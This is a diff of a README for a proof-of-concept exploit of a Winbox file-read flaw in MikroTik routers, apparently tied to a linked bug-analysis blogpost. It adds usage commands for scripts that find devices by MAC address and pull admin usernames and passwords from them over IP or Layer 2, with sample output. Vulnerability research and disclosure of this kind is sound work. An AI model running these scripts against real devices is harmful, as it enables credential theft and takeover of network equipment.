@@ -1,15 +1,34 @@
-# WinboxPoC
-Proof of Concept of Winbox Critical Vulnerability
+# WinboxExploit
+Proof of Concept of Winbox Critical Vulnerability  
+Arbitrary file read
 
 # Blogpost
 https://n0p.me/winbox-bug-dissection/
 
 
 ## How to use
-Run it :)
+Winbox (TCP/IP)
 ```
-$ python3 PoC.py 172.17.17.17
-172.17.17.17
+$ python3 WinboxExploit.py 172.17.17.17
+
+User: admin
+Pass: Th3P4ssWord
+
+```  
+
+MAC server Winbox (Layer 2)  
+You can extract files even if the device doesn't have an IP address :-)
+```
+$ python3 MACServerDiscover.py
+Looking for Mikrotik devices (MAC servers)
+
+    aa:bb:cc:dd:ee:ff 
+
+    aa:bb:cc:dd:ee:aa
+
+```
+```
+$ python3 MACServerExploit.py aa:bb:cc:dd:ee:ff
 
 User: admin
 Pass: Th3P4ssWord
